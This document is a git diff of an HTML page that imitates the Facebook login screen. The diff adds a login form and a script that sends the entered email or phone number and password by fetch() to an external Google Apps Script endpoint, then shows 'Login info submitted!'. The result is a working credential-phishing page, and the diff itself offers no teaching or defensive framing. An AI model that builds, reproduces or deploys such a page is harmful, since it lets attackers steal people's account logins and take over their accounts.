@@ -1,35 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook-log in or sign up</title>
-    <link rel="stylesheet" href="main.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  
+
+  <link rel="stylesheet" href="style.css">
 </head>
-<body bgcolor="#F0F2F5">
-<div id="container">
-    <div class="logo"></div>
-</div>
+<body>
+  <div class="main-container" >
+    <div class="left" style="margin-left: 0px;" >
+      <h1 style="color:#1877f2; margin-left: 0px;">facebook</h1>
+      <p>Facebook helps you connect- and share with the people in your life.</p>
 
-<div id="loginContainer">
-    <div id="input">
-        <input type="email" placeholder="Email or Phone Number">
-        
-        <input type="password" placeholder="Password">
+      <div class="logo"></div>
     </div>
-
-    <div id="button">
-        <button><a href="https://www.facebook.com/login.php/" style="color: white; text-decoration: none; margin-left: 10px;">Log In</a></button>
-        <br>
-        <br>
-        <a href="#" style="text-decoration: none;">Forgot account?</a>
+    <div class="right">
+      <form id="login-form">
+        <input style="width: 320px;" type="email" name="email" placeholder="Email or Phone Number" required>
+        <input style="width: 320px;" type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+        <a href="#">Forgot account?</a>
+        <hr>
+        <button type="button" class="create" style="background-color: #42b72a;">Create New Account</button>
+      </form>
     </div>
-    <br>
-    <div id="line"></div>
-    <br><br>
-    <button id="newAccount">Create New Account</button>
+  </div>
 
-</div>
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyY9iuREhuxa0O3HD4-eiE0YSNCC5aJ0EZL7PB8yN3hgNAvkDt8Qy_9bbLml8PAo0Sh/exec';
+    const form = document.getElementById('login-form');
 
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => alert("Login info submitted!"))
+        .catch(error => alert("Error: " + error.message));
+    });
+  </script>
 </body>
 </html>
